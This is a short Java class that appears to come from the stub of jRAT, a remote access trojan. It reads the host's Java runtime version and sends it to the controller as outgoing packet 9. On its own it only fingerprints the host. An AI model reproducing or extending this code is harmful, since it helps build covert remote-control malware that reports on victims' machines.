package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet9InitJavaVersion extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String version = System.getProperty("java.runtime.version");
		
		sw.writeLine(version);
	}

	@Override
	public byte getPacketId() {
		return (byte) 9;
	}

}
